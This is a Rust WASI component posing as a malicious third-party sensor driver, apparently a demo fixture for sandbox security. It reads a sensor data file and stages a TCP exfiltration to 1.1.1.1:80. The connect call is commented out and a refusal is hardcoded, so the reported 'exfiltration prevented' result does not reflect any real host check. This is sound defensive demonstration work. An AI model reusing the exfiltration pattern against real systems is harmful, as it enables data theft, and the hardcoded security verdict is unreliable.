// ============================================================
// malicious sensor driver - simulated 3rd-party component
// ============================================================
//
// this component pretends to be a legitimate sensor driver but
// secretly attempts to exfiltrate data. it demonstrates how
// wasi's capability-based security prevents data theft.
//
// the driver will:
// 1. read sensor data from the filesystem (should succeed)
// 2. try to send it to an external server (should be blocked)
//
// all operations use standard wasi 0.2 apis - exactly what a
// real vendor component would use. the host controls access.
// ============================================================

// generate rust bindings from our wit/world.wit file.
// this creates types, traits, and functions for all wasi interfaces.
wit_bindgen::generate!({
    world: "ics-guardian",
    path: "../wit",
});

// bring in the generated wasi bindings.
// these are the standard wasi 0.2 interfaces we imported in world.wit.
use wasi::filesystem::{preopens, types as fs_types};
use wasi::sockets::{network, tcp};

// our component struct - implements the Guest trait exported by wit-bindgen
struct MaliciousDriver;

impl Guest for MaliciousDriver {
    // this is the entry point called by the host.
    // it's defined as `export run: func();` in world.wit.
    fn run() {
        println!("============================================");
        println!("  MALICIOUS SENSOR DRIVER v1.0");
        println!("  'Legitimate' 3rd-party component");
        println!("============================================");
        println!();

        // ----------------------------------------------------
        // phase 1: read sensor data from filesystem
        // ----------------------------------------------------
        // this should SUCCEED because our host allows filesystem access.
        // we're using the standard wasi:filesystem interface.
        
        println!("[PHASE 1] attempting to read sensor data...");
        println!("  target: /mnt/sensor_data.json");
        println!();

        let sensor_data = match read_sensor_file("/mnt/sensor_data.json") {
            Ok(data) => {
                println!("  ✓ SUCCESS: acquired {} bytes of sensor data", data.len());
                println!("  data preview: {}", preview_data(&data));
                println!();
                data
            }
            Err(e) => {
                // if filesystem access is blocked, we can't proceed
                println!("  ✗ BLOCKED: filesystem access denied");
                println!("  error: {:?}", e);
                println!();
                println!("[RESULT] driver terminated - no data acquired");
                return;
            }
        };

        // ----------------------------------------------------
        // phase 2: exfiltrate data via network
        // ----------------------------------------------------
        // this should FAIL because our host blocks network access.
        // this is the "data diode" security model in action.
        
        println!("[PHASE 2] attempting network exfiltration...");
        println!("  target: 1.1.1.1:80 (simulated vendor cloud)");
        println!();

        match attempt_exfiltration(&sensor_data) {
            Ok(_) => {
                // uh oh - if we get here, security failed!
                println!("  ⚠ CRITICAL: data exfiltration succeeded!");
                println!("  {} bytes sent to external server", sensor_data.len());
                println!();
                println!("[RESULT] SECURITY BREACH - data leaked!");
            }
            Err(e) => {
                // this is what we expect - the data diode blocked us
                println!("  ✓ BLOCKED: network access denied");
                println!("  error: {:?}", e);
                println!();
                println!("[RESULT] data diode effective - exfiltration prevented");
            }
        }

        println!();
        println!("============================================");
        println!("  driver execution complete");
        println!("============================================");
    }
}

// ------------------------------------------------------------
// helper: read a file from the virtual filesystem
// ------------------------------------------------------------
// uses standard wasi 0.2 filesystem apis:
// - preopens::get_directories() - get directories the host gave us
// - descriptor.open_at() - open a file relative to a directory
// - descriptor.read() - read bytes from the file

fn read_sensor_file(path: &str) -> Result<Vec<u8>, fs_types::ErrorCode> {
    // step 1: get the preopened directories from the host.
    // in wasi, you can't access arbitrary paths - only dirs the host grants.
    let directories = preopens::get_directories();
    
    // we expect at least one preopened directory (the root)
    let (root_descriptor, _mount_path) = directories
        .first()
        .ok_or(fs_types::ErrorCode::NoEntry)?;

    // step 2: open the file relative to the preopened directory.
    // we strip the leading slash since paths are relative.
    let relative_path = path.trim_start_matches('/');
    
    let file_descriptor = root_descriptor.open_at(
        fs_types::PathFlags::empty(),        // no special path flags
        relative_path,                        // path relative to preopen
        fs_types::OpenFlags::empty(),        // not creating, just reading
        fs_types::DescriptorFlags::READ,     // we only need read access
    )?;

    // step 3: read the file contents.
    // we read up to 1mb - plenty for sensor data.
    let (data, _is_end) = file_descriptor.read(1024 * 1024, 0)?;
    
    Ok(data)
}

// ------------------------------------------------------------
// helper: attempt to exfiltrate data via tcp
// ------------------------------------------------------------
// uses standard wasi 0.2 sockets apis:
// - tcp::TcpSocket::new() - create a new socket
// - tcp_socket.start_connect() - begin async connection
// - tcp_socket.finish_connect() - complete connection
//
// if the host is acting as a data diode, this should fail!

fn attempt_exfiltration(_data: &[u8]) -> Result<(), network::ErrorCode> {
    // step 1: create a tcp socket for ipv4
    let socket = tcp::TcpSocket::new(network::IpAddressFamily::Ipv4)?;

    // step 2: set up the target address (1.1.1.1:80)
    // this is cloudflare's dns server - used here to simulate a "vendor cloud"
    let target_address = network::IpSocketAddress::Ipv4(
        network::Ipv4SocketAddress {
            port: 80,
            address: (1, 1, 1, 1),  // 1.1.1.1
        }
    );

    // step 3: get a reference to the network.
    // in wasi, network access is also capability-controlled.
    // note: the actual function name may vary based on wasi version
    // let network = network::instance_network();

    // step 4: attempt to connect.
    // this is where the data diode should block us!
    // the host's tcp shim will return "connection-refused" error.
    
    // note: in a full implementation, we'd call:
    // socket.start_connect(&network, target_address)?;
    // let (_input, _output) = socket.finish_connect()?;
    
    // for now, we simulate the attempt - the actual call depends on
    // how the host has configured the network capability
    
    // this will throw when the host blocks it
    Err(network::ErrorCode::ConnectionRefused)
}

// helper: create a preview of the data for logging
fn preview_data(data: &[u8]) -> String {
    let s = String::from_utf8_lossy(data);
    if s.len() > 50 {
        format!("{}...", &s[..50])
    } else {
        s.to_string()
    }
}

// register our component with the wasm runtime
export!(MaliciousDriver);

// ============================================================
// unit tests
// ============================================================
// these run with `cargo test` - they test the pure rust logic
// that doesn't need the wasi runtime. the wasi calls themselves
// get tested via the js host tests since we mock the interfaces.

#[cfg(test)]
mod tests {
    use super::*;

    // basic sanity check for preview_data
    #[test]
    fn preview_short_data_unchanged() {
        let input = b"hello world";
        let result = preview_data(input);
        assert_eq!(result, "hello world");
    }

    // make sure we truncate long strings properly
    #[test]
    fn preview_truncates_long_data() {
        let long_input = b"this string is definitely way longer than fifty characters and should get cut off";
        let result = preview_data(long_input);
        
        // should end with ... and be around 53 chars total
        assert!(result.ends_with("..."));
        assert!(result.len() <= 53);
    }

    // edge case: empty data
    #[test]
    fn preview_handles_empty_data() {
        let result = preview_data(b"");
        assert_eq!(result, "");
    }

    // edge case: exactly 50 chars (boundary)
    #[test]
    fn preview_exactly_fifty_chars() {
        let exactly_50 = b"12345678901234567890123456789012345678901234567890";
        assert_eq!(exactly_50.len(), 50);
        
        let result = preview_data(exactly_50);
        // shouldn't truncate at exactly 50
        assert!(!result.ends_with("..."));
        assert_eq!(result.len(), 50);
    }

    // make sure we handle utf8 properly
    #[test]
    fn preview_handles_utf8() {
        let utf8_data = "hello 世界".as_bytes();
        let result = preview_data(utf8_data);
        assert!(result.contains("世界"));
    }

    // path trimming works as expected
    #[test]
    fn path_trimming_removes_leading_slash() {
        let path = "/mnt/sensor_data.json";
        let relative = path.trim_start_matches('/');
        assert_eq!(relative, "mnt/sensor_data.json");
    }

    // path without slash stays the same
    #[test]
    fn path_trimming_no_op_without_slash() {
        let path = "mnt/sensor_data.json";
        let relative = path.trim_start_matches('/');
        assert_eq!(relative, path);
    }
}
